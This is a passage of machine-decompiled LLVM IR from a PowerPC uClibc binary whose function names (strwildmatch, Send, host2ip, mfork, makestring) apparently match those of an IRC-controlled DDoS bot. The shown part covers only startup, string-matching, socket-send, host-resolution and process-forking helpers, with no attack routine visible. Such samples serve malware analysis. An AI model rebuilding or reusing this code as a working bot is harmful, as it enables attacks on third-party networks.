  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_1002c3f8.12, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_1002c3f8.12, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001a0 = load i32, i32* @global_var_100279e0.18, align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %entry
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %entry
  ret i32 ptrtoint (i32* @global_var_100279e0.18 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @__uClibc_main(i32 268444728, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 268523900, i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp18 = ptrtoint i8* %arg1 to i32
  %v2_1000025c = load i8, i8* %arg1, align 1
  %v3_1000026c = icmp eq i8 %v2_1000025c, 84
  br i1 %v3_1000026c, label %dec_label_pc_10000544, label %dec_label_pc_10000274

dec_label_pc_10000274:                            ; preds = %entry
  %v2_1000026c = icmp ugt i8 %v2_1000025c, 84
  br i1 %v2_1000026c, label %dec_label_pc_100002c4, label %dec_label_pc_10000280

dec_label_pc_10000280:                            ; preds = %dec_label_pc_10000274
  %v3_10000284 = icmp eq i8 %v2_1000025c, 66
  br i1 %v3_10000284, label %dec_label_pc_1000045c, label %dec_label_pc_1000028c

dec_label_pc_1000028c:                            ; preds = %dec_label_pc_10000280
  %v2_10000284 = icmp ugt i8 %v2_1000025c, 66
  br i1 %v2_10000284, label %dec_label_pc_100002b4, label %dec_label_pc_10000298

dec_label_pc_10000298:                            ; preds = %dec_label_pc_1000028c
  %v3_1000029c = icmp eq i8 %v2_1000025c, 0
  br i1 %v3_1000029c, label %dec_label_pc_100002ec, label %dec_label_pc_100002a4

dec_label_pc_100002a4:                            ; preds = %dec_label_pc_10000298
  %v3_100002a8 = icmp eq i8 %v2_1000025c, 63
  br i1 %v3_100002a8, label %dec_label_pc_100005b8, label %dec_label_pc_10000614

dec_label_pc_100002b4:                            ; preds = %dec_label_pc_1000028c
  %v3_100002b8 = icmp eq i8 %v2_1000025c, 79
  br i1 %v3_100002b8, label %dec_label_pc_100004d0, label %dec_label_pc_10000614

dec_label_pc_100002c4:                            ; preds = %dec_label_pc_10000274
  %v3_100002c8 = icmp eq i8 %v2_1000025c, 111
  br i1 %v3_100002c8, label %dec_label_pc_10000374, label %dec_label_pc_100002d0

dec_label_pc_100002d0:                            ; preds = %dec_label_pc_100002c4
  %v3_100002d4 = icmp eq i8 %v2_1000025c, 116
  br i1 %v3_100002d4, label %dec_label_pc_100003e8, label %dec_label_pc_100002dc

dec_label_pc_100002dc:                            ; preds = %dec_label_pc_100002d0
  %v3_100002e0 = icmp eq i8 %v2_1000025c, 98
  br i1 %v3_100002e0, label %dec_label_pc_10000300, label %dec_label_pc_10000614

dec_label_pc_100002ec:                            ; preds = %dec_label_pc_10000298
  %v2_100002f0 = load i8, i8* %tmp, align 1
  %v3_100002f0 = zext i8 %v2_100002f0 to i32
  br label %dec_label_pc_10000698

dec_label_pc_10000300:                            ; preds = %dec_label_pc_100002dc
  %v2_10000304 = add i32 %tmp18, 1
  store i32 268436244, i32* @lr, align 4
  %v5_10000310 = inttoptr i32 %v2_10000304 to i8*
  %v6_10000310 = call i32 @strwildmatch(i8* %v5_10000310, i32 %arg2, i32 %tmp18)
  %v3_10000318 = icmp eq i32 %v6_10000310, 0
  br i1 %v3_10000318, label %dec_label_pc_10000360, label %dec_label_pc_10000320

dec_label_pc_10000320:                            ; preds = %dec_label_pc_10000300
  %v2_10000324 = load i8, i8* %tmp, align 1
  %v3_1000032c = icmp eq i8 %v2_10000324, 0
  br i1 %v3_1000032c, label %dec_label_pc_10000368, label %dec_label_pc_10000334

dec_label_pc_10000334:                            ; preds = %dec_label_pc_10000320
  %v2_10000338 = add i32 %arg2, 1
  store i32 268436296, i32* @lr, align 4
  %v6_10000344 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v2_10000338, i32 %arg2)
  %v3_1000034c = icmp eq i32 %v6_10000344, 0
  br i1 %v3_1000034c, label %dec_label_pc_10000360, label %dec_label_pc_10000368

dec_label_pc_10000360:                            ; preds = %dec_label_pc_10000334, %dec_label_pc_10000300
  br label %dec_label_pc_10000368

dec_label_pc_10000368:                            ; preds = %dec_label_pc_10000320, %dec_label_pc_10000334, %dec_label_pc_10000360
  %storemerge5 = phi i32 [ 0, %dec_label_pc_10000360 ], [ 1, %dec_label_pc_10000334 ], [ 1, %dec_label_pc_10000320 ]
  br label %dec_label_pc_10000698

dec_label_pc_10000374:                            ; preds = %dec_label_pc_100002c4
  %v2_10000378 = add i32 %tmp18, 1
  store i32 268436360, i32* @lr, align 4
  %v5_10000384 = inttoptr i32 %v2_10000378 to i8*
  %v6_10000384 = call i32 @strwildmatch(i8* %v5_10000384, i32 %arg2, i32 %tmp18)
  %v3_1000038c = icmp eq i32 %v6_10000384, 0
  br i1 %v3_1000038c, label %dec_label_pc_100003d4, label %dec_label_pc_10000394

dec_label_pc_10000394:                            ; preds = %dec_label_pc_10000374
  %v2_10000398 = load i8, i8* %tmp, align 1
  %v3_100003a0 = icmp eq i8 %v2_10000398, 0
  br i1 %v3_100003a0, label %dec_label_pc_100003dc, label %dec_label_pc_100003a8

dec_label_pc_100003a8:                            ; preds = %dec_label_pc_10000394
  %v2_100003ac = add i32 %arg2, 1
  store i32 268436412, i32* @lr, align 4
  %v6_100003b8 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v2_100003ac, i32 %arg2)
  %v3_100003c0 = icmp eq i32 %v6_100003b8, 0
  br i1 %v3_100003c0, label %dec_label_pc_100003d4, label %dec_label_pc_100003dc

dec_label_pc_100003d4:                            ; preds = %dec_label_pc_100003a8, %dec_label_pc_10000374
  br label %dec_label_pc_100003dc

dec_label_pc_100003dc:                            ; preds = %dec_label_pc_10000394, %dec_label_pc_100003a8, %dec_label_pc_100003d4
  %storemerge7 = phi i32 [ 0, %dec_label_pc_100003d4 ], [ 1, %dec_label_pc_100003a8 ], [ 1, %dec_label_pc_10000394 ]
  br label %dec_label_pc_10000698

dec_label_pc_100003e8:                            ; preds = %dec_label_pc_100002d0
  %v2_100003ec = add i32 %tmp18, 1
  store i32 268436476, i32* @lr, align 4
  %v5_100003f8 = inttoptr i32 %v2_100003ec to i8*
  %v6_100003f8 = call i32 @strwildmatch(i8* %v5_100003f8, i32 %arg2, i32 %tmp18)
  %v3_10000400 = icmp eq i32 %v6_100003f8, 0
  br i1 %v3_10000400, label %dec_label_pc_10000448, label %dec_label_pc_10000408

dec_label_pc_10000408:                            ; preds = %dec_label_pc_100003e8
  %v2_1000040c = load i8, i8* %tmp, align 1
  %v3_10000414 = icmp eq i8 %v2_1000040c, 0
  br i1 %v3_10000414, label %dec_label_pc_10000450, label %dec_label_pc_1000041c

dec_label_pc_1000041c:                            ; preds = %dec_label_pc_10000408
  %v2_10000420 = add i32 %arg2, 1
  store i32 268436528, i32* @lr, align 4
  %v6_1000042c = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v2_10000420, i32 %arg2)
  %v3_10000434 = icmp eq i32 %v6_1000042c, 0
  br i1 %v3_10000434, label %dec_label_pc_10000448, label %dec_label_pc_10000450

dec_label_pc_10000448:                            ; preds = %dec_label_pc_1000041c, %dec_label_pc_100003e8
  br label %dec_label_pc_10000450

dec_label_pc_10000450:                            ; preds = %dec_label_pc_10000408, %dec_label_pc_1000041c, %dec_label_pc_10000448
  %storemerge6 = phi i32 [ 0, %dec_label_pc_10000448 ], [ 1, %dec_label_pc_1000041c ], [ 1, %dec_label_pc_10000408 ]
  br label %dec_label_pc_10000698

dec_label_pc_1000045c:                            ; preds = %dec_label_pc_10000280
  %v2_10000460 = add i32 %tmp18, 1
  store i32 268436592, i32* @lr, align 4
  %v5_1000046c = inttoptr i32 %v2_10000460 to i8*
  %v6_1000046c = call i32 @strwildmatch(i8* %v5_1000046c, i32 %arg2, i32 %tmp18)
  %v3_10000474 = icmp eq i32 %v6_1000046c, 0
  br i1 %v3_10000474, label %dec_label_pc_100004bc, label %dec_label_pc_1000047c

dec_label_pc_1000047c:                            ; preds = %dec_label_pc_1000045c
  %v2_10000480 = load i8, i8* %tmp, align 1
  %v3_10000488 = icmp eq i8 %v2_10000480, 0
  br i1 %v3_10000488, label %dec_label_pc_100004c4, label %dec_label_pc_10000490

dec_label_pc_10000490:                            ; preds = %dec_label_pc_1000047c
  %v2_10000494 = add i32 %arg2, 1
  store i32 268436644, i32* @lr, align 4
  %v6_100004a0 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v2_10000494, i32 %arg2)
  %v3_100004a8 = icmp eq i32 %v6_100004a0, 0
  br i1 %v3_100004a8, label %dec_label_pc_100004bc, label %dec_label_pc_100004c4

dec_label_pc_100004bc:                            ; preds = %dec_label_pc_10000490, %dec_label_pc_1000045c
  br label %dec_label_pc_100004c4

dec_label_pc_100004c4:                            ; preds = %dec_label_pc_1000047c, %dec_label_pc_10000490, %dec_label_pc_100004bc
  %storemerge4 = phi i32 [ 0, %dec_label_pc_100004bc ], [ 1, %dec_label_pc_10000490 ], [ 1, %dec_label_pc_1000047c ]
  br label %dec_label_pc_10000698

dec_label_pc_100004d0:                            ; preds = %dec_label_pc_100002b4
  %v2_100004d4 = add i32 %tmp18, 1
  store i32 268436708, i32* @lr, align 4
  %v5_100004e0 = inttoptr i32 %v2_100004d4 to i8*
  %v6_100004e0 = call i32 @strwildmatch(i8* %v5_100004e0, i32 %arg2, i32 %tmp18)
  %v3_100004e8 = icmp eq i32 %v6_100004e0, 0
  br i1 %v3_100004e8, label %dec_label_pc_10000530, label %dec_label_pc_100004f0

dec_label_pc_100004f0:                            ; preds = %dec_label_pc_100004d0
  %v2_100004f4 = load i8, i8* %tmp, align 1
  %v3_100004fc = icmp eq i8 %v2_100004f4, 0
  br i1 %v3_100004fc, label %dec_label_pc_10000538, label %dec_label_pc_10000504

dec_label_pc_10000504:                            ; preds = %dec_label_pc_100004f0
  %v2_10000508 = add i32 %arg2, 1
  store i32 268436760, i32* @lr, align 4
  %v6_10000514 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v2_10000508, i32 %arg2)
  %v3_1000051c = icmp eq i32 %v6_10000514, 0
  br i1 %v3_1000051c, label %dec_label_pc_10000530, label %dec_label_pc_10000538

dec_label_pc_10000530:                            ; preds = %dec_label_pc_10000504, %dec_label_pc_100004d0
  br label %dec_label_pc_10000538

dec_label_pc_10000538:                            ; preds = %dec_label_pc_100004f0, %dec_label_pc_10000504, %dec_label_pc_10000530
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10000530 ], [ 1, %dec_label_pc_10000504 ], [ 1, %dec_label_pc_100004f0 ]
  br label %dec_label_pc_10000698

dec_label_pc_10000544:                            ; preds = %entry
  %v2_10000548 = add i32 %tmp18, 1
  store i32 268436824, i32* @lr, align 4
  %v5_10000554 = inttoptr i32 %v2_10000548 to i8*
  %v6_10000554 = call i32 @strwildmatch(i8* %v5_10000554, i32 %arg2, i32 %tmp18)
  %v3_1000055c = icmp eq i32 %v6_10000554, 0
  br i1 %v3_1000055c, label %dec_label_pc_100005a4, label %dec_label_pc_10000564

dec_label_pc_10000564:                            ; preds = %dec_label_pc_10000544
  %v2_10000568 = load i8, i8* %tmp, align 1
  %v3_10000570 = icmp eq i8 %v2_10000568, 0
  br i1 %v3_10000570, label %dec_label_pc_100005ac, label %dec_label_pc_10000578

dec_label_pc_10000578:                            ; preds = %dec_label_pc_10000564
  %v2_1000057c = add i32 %arg2, 1
  store i32 268436876, i32* @lr, align 4
  %v6_10000588 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v2_1000057c, i32 %arg2)
  %v3_10000590 = icmp eq i32 %v6_10000588, 0
  br i1 %v3_10000590, label %dec_label_pc_100005a4, label %dec_label_pc_100005ac

dec_label_pc_100005a4:                            ; preds = %dec_label_pc_10000578, %dec_label_pc_10000544
  br label %dec_label_pc_100005ac

dec_label_pc_100005ac:                            ; preds = %dec_label_pc_10000564, %dec_label_pc_10000578, %dec_label_pc_100005a4
  %storemerge8 = phi i32 [ 0, %dec_label_pc_100005a4 ], [ 1, %dec_label_pc_10000578 ], [ 1, %dec_label_pc_10000564 ]
  br label %dec_label_pc_10000698

dec_label_pc_100005b8:                            ; preds = %dec_label_pc_100002a4
  %v2_100005bc = load i8, i8* %tmp, align 1
  %v3_100005c4 = icmp eq i8 %v2_100005bc, 0
  br i1 %v3_100005c4, label %dec_label_pc_10000608, label %dec_label_pc_100005cc

dec_label_pc_100005cc:                            ; preds = %dec_label_pc_100005b8
  %v1_100005d0 = add i32 %tmp18, 1
  %v2_100005d8 = add i32 %arg2, 1
  store i32 268436968, i32* @lr, align 4
  %v4_100005e4 = inttoptr i32 %v1_100005d0 to i8*
  %v5_100005e4 = call i32 @strwildmatch(i8* %v4_100005e4, i32 %v2_100005d8, i32 %arg2)
  %v3_100005ec = icmp ne i32 %v5_100005e4, 0
  %. = zext i1 %v3_100005ec to i32
  br label %dec_label_pc_10000608

dec_label_pc_10000608:                            ; preds = %dec_label_pc_100005cc, %dec_label_pc_100005b8
  %storemerge2 = phi i32 [ 1, %dec_label_pc_100005b8 ], [ %., %dec_label_pc_100005cc ]
  br label %dec_label_pc_10000698

dec_label_pc_10000614:                            ; preds = %dec_label_pc_100002dc, %dec_label_pc_100002b4, %dec_label_pc_100002a4
  %v3_10000618 = load i8, i8* %arg1, align 1
  %v4_10000618 = zext i8 %v3_10000618 to i32
  store i32 268437036, i32* @lr, align 4
  %v3_10000628 = call i32 @__GI_toupper(i32 %v4_10000618, i32 %tmp18)
  %v3_10000634 = load i8, i8* %tmp, align 1
  %v4_10000634 = zext i8 %v3_10000634 to i32
  store i32 268437064, i32* @lr, align 4
  %v3_10000644 = call i32 @__GI_toupper(i32 %v4_10000634, i32 %arg2)
  %v4_1000064c = icmp eq i32 %v3_10000628, %v3_10000644
  br i1 %v4_1000064c, label %dec_label_pc_10000654, label %dec_label_pc_10000690

dec_label_pc_10000654:                            ; preds = %dec_label_pc_10000614
  %v1_10000658 = add i32 %tmp18, 1
  %v2_10000660 = add i32 %arg2, 1
  store i32 268437104, i32* @lr, align 4
  %v4_1000066c = inttoptr i32 %v1_10000658 to i8*
  %v5_1000066c = call i32 @strwildmatch(i8* %v4_1000066c, i32 %v2_10000660, i32 %arg2)
  %v3_10000674 = icmp ne i32 %v5_1000066c, 0
  %.17 = zext i1 %v3_10000674 to i32
  br label %dec_label_pc_10000690

dec_label_pc_10000690:                            ; preds = %dec_label_pc_10000654, %dec_label_pc_10000614
  %storemerge = phi i32 [ 1, %dec_label_pc_10000614 ], [ %.17, %dec_label_pc_10000654 ]
  br label %dec_label_pc_10000698

dec_label_pc_10000698:                            ; preds = %dec_label_pc_100002ec, %dec_label_pc_10000608, %dec_label_pc_100005ac, %dec_label_pc_10000538, %dec_label_pc_100004c4, %dec_label_pc_10000450, %dec_label_pc_100003dc, %dec_label_pc_10000368, %dec_label_pc_10000690
  %stack_var_-32.0 = phi i32 [ %storemerge8, %dec_label_pc_100005ac ], [ %storemerge7, %dec_label_pc_100003dc ], [ %storemerge6, %dec_label_pc_10000450 ], [ %storemerge5, %dec_label_pc_10000368 ], [ %storemerge, %dec_label_pc_10000690 ], [ %storemerge4, %dec_label_pc_100004c4 ], [ %storemerge3, %dec_label_pc_10000538 ], [ %v3_100002f0, %dec_label_pc_100002ec ], [ %storemerge2, %dec_label_pc_10000608 ]
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i8 %v2_1000025c, { 0, 1, 2, 3, 4, 5, 7, 6, 9, 8 }
  uselistorder i32 %tmp18, { 5, 6, 0, 13, 14, 1, 2, 3, 4, 9, 10, 11, 12, 7, 8 }
  uselistorder i8* %tmp, { 4, 0, 8, 2, 3, 6, 7, 5, 1 }
  uselistorder i32 (i32, i32)* @__GI_toupper, { 1, 0 }
  uselistorder i8 66, { 1, 0 }
  uselistorder i8 84, { 1, 0 }
  uselistorder i32 %arg2, { 20, 21, 22, 18, 19, 0, 1, 2, 15, 16, 17, 12, 13, 14, 6, 7, 8, 3, 4, 5, 9, 10, 11, 23 }
  uselistorder i8* %arg1, { 2, 6, 0, 1, 4, 5, 3, 7, 8 }
  uselistorder label %dec_label_pc_10000698, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_100005ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10000538, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100004c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10000450, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100003dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10000368, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg5, i32* @r7, align 4
  %stack_var_-136 = alloca i32, align 4
  store i32 2, i32* %stack_var_-136, align 4
  store i32 ptrtoint (i32* @global_var_1002c414.19 to i32), i32* @r3, align 4
  %v2_10000740 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268437324, i32* @lr, align 4
  %v4_10000748 = call i32 @vsprintf(i32 ptrtoint (i32* @global_var_1002c414.19 to i32), i32 %arg2, i32 %v2_10000740, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  store i32 ptrtoint (i32* @global_var_1002c414.19 to i32), i32* @r3, align 4
  %v0_10000754 = call i32 @__GI_strlen()
  store i32 268437360, i32* @lr, align 4
  %v4_1000076c = call i32 @write(i32 %arg1, i32 ptrtoint (i32* @global_var_1002c414.19 to i32), i32 %v0_10000754, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  ret i32 %v4_1000076c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002c414.19 to i32), { 1, 2, 0, 3 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268437428, i32* @lr, align 4
  %v1_100007b0 = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_100007b0, i32* @global_var_1002c2f0.20, align 4
  %v4_100007cc = icmp eq i32 %v1_100007b0, -1
  br i1 %v4_100007cc, label %dec_label_pc_100007d4, label %dec_label_pc_10000848

dec_label_pc_100007d4:                            ; preds = %entry
  store i32 268437468, i32* @lr, align 4
  %v2_100007d8 = call i32 @__GI_gethostbyname(i32 %arg2, i32 -1)
  %v3_100007e8 = icmp eq i32 %v2_100007d8, 0
  br i1 %v3_100007e8, label %dec_label_pc_100007f0, label %dec_label_pc_1000081c

dec_label_pc_100007f0:                            ; preds = %dec_label_pc_100007d4
  %v3_100007f4 = load i32, i32* @global_var_1002c300.21, align 4
  %v6_10000810 = call i32 @Send(i32 %v3_100007f4, i32 ptrtoint ([33 x i8]* @global_var_100159b8.22 to i32), i32 %arg1, i32 %arg2, i32 268500992)
  %v0_10000818 = call i32 @__GI_exit()
  br label %dec_label_pc_1000081c

dec_label_pc_1000081c:                            ; preds = %dec_label_pc_100007d4, %dec_label_pc_100007f0
  %v1_10000820 = add i32 %v2_100007d8, 16
  %v2_10000820 = inttoptr i32 %v1_10000820 to i32*
  %v3_10000820 = load i32, i32* %v2_10000820, align 4
  %v1_10000824 = inttoptr i32 %v3_10000820 to i32*
  %v2_10000824 = load i32, i32* %v1_10000824, align 4
  %v1_10000834 = add i32 %v2_100007d8, 12
  %v2_10000834 = inttoptr i32 %v1_10000834 to i32*
  %v3_10000834 = load i32, i32* %v2_10000834, align 4
  store i32 %v3_10000834, i32* @r5, align 4
  store i32 268437576, i32* @lr, align 4
  %v4_10000844 = call i32 @bcopy(i32 %v2_10000824, i32 ptrtoint (i32* @global_var_1002c2f0.20 to i32), i32 %v3_10000834, i32 %v2_100007d8)
  %v3_1000084c.pre = load i32, i32* @global_var_1002c2f0.20, align 4
  br label %dec_label_pc_10000848

dec_label_pc_10000848:                            ; preds = %entry, %dec_label_pc_1000081c
  %v3_1000084c = phi i32 [ %v1_100007b0, %entry ], [ %v3_1000084c.pre, %dec_label_pc_1000081c ]
  ret i32 %v3_1000084c

; uselistorder directives
  uselistorder i32 %v3_10000834, { 1, 0 }
  uselistorder i32 %v2_100007d8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10000848, { 1, 0 }
  uselistorder label %dec_label_pc_1000081c, { 1, 0 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10000888 = load i8, i8* @global_var_1002c2e0.24, align 1
  %v3_10000890 = icmp eq i8 %v3_10000888, 1
  br i1 %v3_10000890, label %dec_label_pc_10000898, label %dec_label_pc_100008c4

dec_label_pc_10000898:                            ; preds = %entry
  %v3_1000089c = load i32, i32* @global_var_1002c300.21, align 4
  %v5_100008b4 = load i32, i32* @r7, align 4
  %v6_100008b4 = call i32 @Send(i32 %v3_1000089c, i32 ptrtoint ([30 x i8]* @global_var_100159dc.25 to i32), i32 %arg1, i32 268500992, i32 %v5_100008b4)
  br label %dec_label_pc_100009c8

dec_label_pc_100008c4:                            ; preds = %entry
  store i32 268437704, i32* @lr, align 4
  %v0_100008c4 = call i32 @fork()
  %v3_100008d4 = icmp eq i32 %v0_100008c4, 0
  br i1 %v3_100008d4, label %dec_label_pc_100008dc, label %dec_label_pc_100008e8

dec_label_pc_100008dc:                            ; preds = %dec_label_pc_100008c4
  br label %dec_label_pc_100009c8

dec_label_pc_100008e8:                            ; preds = %dec_label_pc_100008c4
  %v3_100008ec = load i32, i32* @global_var_1002c2ec.27, align 4
  %v1_100008f0 = add i32 %v3_100008ec, 1
  store i32 %v1_100008f0, i32* @global_var_1002c2ec.27, align 4
  %v1_10000904 = mul i32 %v1_100008f0, 4
  %v1_10000908 = add i32 %v1_10000904, 4
  store i32 %v1_10000908, i32* @r3, align 4
  store i32 268437780, i32* @lr, align 4
  %v0_10000910 = call i32 @malloc()
  %v3_1000096c2 = load i32, i32* @global_var_1002c2ec.27, align 4
  %v3_100009784 = icmp eq i32 %v3_1000096c2, 1
  br i1 %v3_100009784, label %dec_label_pc_10000980, label %dec_label_pc_10000928

dec_label_pc_10000928:                            ; preds = %dec_label_pc_100008e8, %dec_label_pc_10000928
  %storemerge16 = phi i32 [ %v1_10000960, %dec_label_pc_10000928 ], [ 0, %dec_label_pc_100008e8 ]
  %v1_1000092c = mul i32 %storemerge16, 4
  %v2_10000938 = add i32 %v1_1000092c, %v0_10000910
  store i32 %v2_10000938, i32* @r10, align 4
  %v3_1000094c = load i32, i32* @global_var_1002c318.28, align 4
  %v2_10000950 = add i32 %v3_1000094c, %v1_1000092c
  %v1_10000954 = inttoptr i32 %v2_10000950 to i32*
  %v2_10000954 = load i32, i32* %v1_10000954, align 4
  %v2_10000958 = inttoptr i32 %v2_10000938 to i32*
  store i32 %v2_10000954, i32* %v2_10000958, align 4
  %v1_10000960 = add i32 %storemerge16, 1
  %v3_1000096c = load i32, i32* @global_var_1002c2ec.27, align 4
  %v1_10000970 = add i32 %v3_1000096c, -1
  %v3_10000978 = icmp ugt i32 %v1_10000970, %v1_10000960
  br i1 %v3_10000978, label %dec_label_pc_10000928, label %dec_label_pc_10000968.dec_label_pc_10000980_crit_edge

dec_label_pc_10000968.dec_label_pc_10000980_crit_edge: ; preds = %dec_label_pc_10000928
  br label %dec_label_pc_10000980

dec_label_pc_10000980:                            ; preds = %dec_label_pc_100008e8, %dec_label_pc_10000968.dec_label_pc_10000980_crit_edge
  %v3_10000984 = phi i32 [ %v3_1000096c, %dec_label_pc_10000968.dec_label_pc_10000980_crit_edge ], [ %v3_1000096c2, %dec_label_pc_100008e8 ]
  %v1_10000988 = mul i32 %v3_10000984, 4
  %v2_10000994 = add i32 %v0_10000910, -4
  %v1_10000998 = add i32 %v2_10000994, %v1_10000988
  %v2_100009a0 = inttoptr i32 %v1_10000998 to i32*
  store i32 %v0_100008c4, i32* %v2_100009a0, align 4
  %v3_100009a8 = load i32, i32* @global_var_1002c318.28, align 4
  store i32 %v3_100009a8, i32* @r3, align 4
  store i32 268437940, i32* @lr, align 4
  %v0_100009b0 = call i32 @free()
  store i32 %v0_10000910, i32* @global_var_1002c318.28, align 4
  br label %dec_label_pc_100009c8

dec_label_pc_100009c8:                            ; preds = %dec_label_pc_100008dc, %dec_label_pc_10000898, %dec_label_pc_10000980
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_10000898 ], [ 0, %dec_label_pc_100008dc ], [ %v0_100008c4, %dec_label_pc_10000980 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %v1_10000960, { 1, 0 }
  uselistorder i32 %v1_1000092c, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 0 }
  uselistorder i32 %v3_1000096c2, { 1, 0 }
  uselistorder i32 %v0_10000910, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100009c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000980, { 1, 0 }
  uselistorder label %dec_label_pc_10000928, { 1, 0 }
}

define i32 @filter(i32 %arg1) local_unnamed_addr {
entry:
  %v2_10000a3c = add i32 %arg1, -1
  br label %dec_label_pc_10000a28

dec_label_pc_10000a04:                            ; preds = %dec_label_pc_10000a54, %dec_label_pc_10000a28
  store i32 %arg1, i32* @r3, align 4
  %v0_10000a08 = call i32 @__GI_strlen()
  %v1_10000a1c = add i32 %v0_10000a08, %v2_10000a3c
  %v3_10000a24 = inttoptr i32 %v1_10000a1c to i8*
  store i8 0, i8* %v3_10000a24, align 1
  br label %dec_label_pc_10000a28

dec_label_pc_10000a28:                            ; preds = %entry, %dec_label_pc_10000a04
  store i32 %arg1, i32* @r3, align 4
  %v0_10000a2c = call i32 @__GI_strlen()
  %v1_10000a40 = add i32 %v0_10000a2c, %v2_10000a3c
  %v1_10000a44 = inttoptr i32 %v1_10000a40 to i8*
  %v2_10000a44 = load i8, i8* %v1_10000a44, align 1
  %v3_10000a4c = icmp eq i8 %v2_10000a44, 13
  br i1 %v3_10000a4c, label %dec_label_pc_10000a04, label %dec_label_pc_10000a54

dec_label_pc_10000a54:                            ; preds = %dec_label_pc_10000a28
  store i32 %arg1, i32* @r3, align 4
  %v0_10000a58 = call i32 @__GI_strlen()
  %v1_10000a6c = add i32 %v0_10000a58, %v2_10000a3c
  %v1_10000a70 = inttoptr i32 %v1_10000a6c to i8*
  %v2_10000a70 = load i8, i8* %v1_10000a70, align 1
  %v3_10000a78 = icmp eq i8 %v2_10000a70, 10
  br i1 %v3_10000a78, label %dec_label_pc_10000a04, label %dec_label_pc_10000a80

dec_label_pc_10000a80:                            ; preds = %dec_label_pc_10000a54
  ret i32 %v0_10000a58

; uselistorder directives
  uselistorder i32 %arg1, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10000a28, { 1, 0 }
}

define i32 @makestring(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-1072 = alloca i32, align 4
  store i32 268438196, i32* @lr, align 4
  %v0_10000ab0 = call i32 @random()
  %v2_10000acc = srem i32 %v0_10000ab0, 5
  %v1_10000ae8 = add nsw i32 %v2_10000acc, 4
  %v1_10000af4 = add nsw i32 %v2_10000acc, 5
  store i32 %v1_10000af4, i32* @r3, align 4
  store i32 268438272, i32* @lr, align 4
  %v0_10000afc = call i32 @malloc()
  store i32 268438312, i32* @lr, align 4
  %v3_10000b24 = call i32 @__GI_memset(i32 %v0_10000afc, i32 0, i32 %v1_10000af4)
  store i32 268438332, i32* @lr, align 4
